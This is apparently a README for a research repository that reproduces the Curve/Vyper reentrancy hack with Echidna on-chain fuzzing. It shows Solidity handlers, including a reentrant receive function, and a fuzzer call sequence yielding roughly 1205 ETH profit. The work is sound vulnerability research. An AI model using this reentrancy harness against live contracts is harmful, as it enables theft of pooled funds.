# Curve Hack - Fuzzing Reproduction

## Description
This repository contains a reproduction of one of the hacks that occurred due to a reentrancy bug in Curve, caused by a compiler issue in Vyper. Assets stolen from the Curve pools due to this security flaw exceeded $41 million. For more details, refer to the [Vyper compiler saga](https://medium.com/rektify-ai/the-vyper-compiler-saga-unraveling-the-reentrancy-bug-that-shook-defi-86ade6c54265) on Rekt.

## Methodology
To reproduce the bug, we utilize Echidna's on-chain fuzzing. 

We define a single invariant to check if an attacker can increase their ETH balance.
```solidity
function testProfit() public {
    uint256 balance = address(this).balance;
    gte(initialBalance, balance, "Profit test");
}
```

We then add handlers to add and remove liquidity to the Curve pool, focusing solely on ETH for simplicity. By clamping, we ensure the fuzzer only adds or removes an amount within the attacker's current balance.
```solidity
    function addLiquidity(uint128 _amount) public {
        _amount = uint128(clampBetween(_amount, 0, address(this).balance));

        uint256[2] memory amount;
        amount[0] = _amount;
        amount[1] = 0;

        pool.add_liquidity{value: _amount}(amount, 0);
    }

    function removeLiquidity(uint128 _amount) public {
        _amount = uint128(
            clampBetween(_amount, 0, pool.balanceOf(address(this)))
        );

        uint256[2] memory amount;
        amount[0] = 0;
        amount[1] = 0;

        pool.remove_liquidity(_amount, amount);
    }
```

Given the hack involves reentrancy, we implement a rudimentary reentrancy handler in the `receive` function.
```solidity
    receive() external payable {
        if (reentrancyEnabled) {
            uint256 functionId = (reentrancyFunction % 2 == 1) ? 0 : 1;

            if (reentrancyFunction == 0) {
                addLiquidity(reentrancyAmount);
            } else if (reentrancyFunction == 1) {
                removeLiquidity(reentrancyAmount);
            }
        }
    }
```

The behavior of this handler is controlled by global variables, which are set by the fuzzer.
```solidity
    function setReentrancyEnabled(bool _reentrancyEnabled) public {
        reentrancyEnabled = _reentrancyEnabled;
    }

    function setReentrancyFunction(uint8 _reentrancyFunction) public {
        reentrancyFunction = _reentrancyFunction;
    }

    function setReentrancyAmount(uint128 _reentrancyAmount) public {
        reentrancyAmount = _reentrancyAmount;
    }
```

Echidna typically detects the bug within 5 minutes using a single worker. The sequence leading to the hacks can be seen below.
```
testProfit(): failed!💥
  Call sequence, shrinking 1739/5000:
    Fuzz.setReentrancyAmount(62297794394773161987899947455086967966)
    Fuzz.addLiquidity(287947091533324425929789050717863786957)
    Fuzz.removeLiquidity(209948338645151591393209938770631982993)
    Fuzz.addLiquidity(58576701019271218016466182754478192010)
    Fuzz.removeLiquidity(967)
    Fuzz.setReentrancyEnabled(false)
    Fuzz.removeLiquidity(247696123990480820083721037276151777885)
    Fuzz.testProfit()

emit AssertGteFail(«Invalid: 1000000000000000000000000<1001205683176915736170634 failed, reason: Profit test»)
```

Total profit: `1205683176915736170634` (1205 ETH).

## Future Research
The current Proof of Concept is deliberately kept simple to optimize for fuzzing. Enhancing it to resemble a more comprehensive fuzzing suite could include:
-  Adding a handler for `exchange`
- Support for adding liquidity to all tokens in the pool
- Simulating multiple actors

While these additions would increase the complexity and slow down the fuzzing process due to a larger search space, they would still effectively reproduce the hack.

## Links
- https://medium.com/rektify-ai/the-vyper-compiler-saga-unraveling-the-reentrancy-bug-that-shook-defi-86ade6c54265
- https://hackmd.io/@LlamaRisk/BJzSKHNjn
- https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-07/Curve_exp01.sol

